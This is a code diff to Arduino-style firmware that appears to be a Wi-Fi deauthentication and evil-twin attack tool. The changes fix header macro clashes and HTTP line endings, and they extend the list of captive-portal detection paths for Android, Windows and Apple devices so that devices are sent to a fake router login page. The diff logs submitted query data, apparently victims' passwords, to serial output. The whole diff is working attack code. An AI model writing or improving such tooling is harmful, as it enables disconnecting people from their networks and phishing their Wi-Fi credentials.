@@ -1,4 +1,14 @@
+// Include C++ STL headers first, before they can be affected by Arduino macros
+#ifdef max
+#undef max
+#undef min
 #include "vector"
+#define max(a,b) ((a)>(b)?(a):(b))
+#define min(a,b) ((a)<(b)?(a):(b))
+#else
+#include "vector"
+#endif
+
 #include "wifi_conf.h"
 #include "wifi_cust_tx.h"
 #include "wifi_drv.h"
@@ -210,11 +220,14 @@ void destroyAP(){
 
 
 String makeResponse(int code, String content_type, bool compresed) {
-  String response = "HTTP/1.1 " + String(code) + " OK\n";
+  String response = "HTTP/1.1 ";
+  response += String(code);
+  response += (code == 200) ? " OK" : (code == 302) ? " Found" : " Not Found";
+  response += "\r\n";
   if(compresed)
-  response += "Content-Encoding: gzip\n";
-  response += "Content-Type: " + content_type + "\n";
-  response += "Connection: close\n\n";
+  response += "Content-Encoding: gzip\r\n";
+  response += "Content-Type: " + content_type + "\r\n";
+  response += "Connection: close\r\n\r\n";
   return response;
 }
 
@@ -635,11 +648,21 @@ void loop() {
             }
             String path = parseRequest(request);
             Serial.println(request);
-            if(path.startsWith("/generate_204")||path.startsWith("/ncsi.txt")||path.startsWith("/success.html")||path.startsWith("/userinput")||path.startsWith("/login")||path.startsWith("/?")||path.equals("/")||path.startsWith("/get")){
+            
+            // Serve portal for all captive portal detection URLs and main portal pages
+            if(path.startsWith("/generate_204") || path.startsWith("/gen_204") ||
+               path.startsWith("/ncsi.txt") || path.startsWith("/connecttest.txt") ||
+               path.startsWith("/hotspot-detect.html") || path.startsWith("/library/test/success.html") ||
+               path.startsWith("/success.txt") || path.startsWith("/success.html") ||
+               path.startsWith("/redirect") ||
+               path.startsWith("/userinput") || path.startsWith("/login") || 
+               path.startsWith("/?") || path.equals("/") || path.startsWith("/get")) {
+              
               if (deauth_wifis.size() != 0)
                 handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
               else
                 handleRequest(client, (enum portals)portal, "router");
+                
               if (path.indexOf('?') && (path.indexOf('=') > path.indexOf('?'))) {
                 String datos = path.substring(path.indexOf('?') + 1);
                 if (datos.length() > 0) {
@@ -647,10 +670,12 @@ void loop() {
                   Serial1.println(datos);
                 }
               }
-          }else{
-            handle404(client);
-          }   
-          break;
+              break;
+              
+            } else {
+              handle404(client);
+              break;
+            }
 
           }else if(character == '%'){
             char buff[2] ;
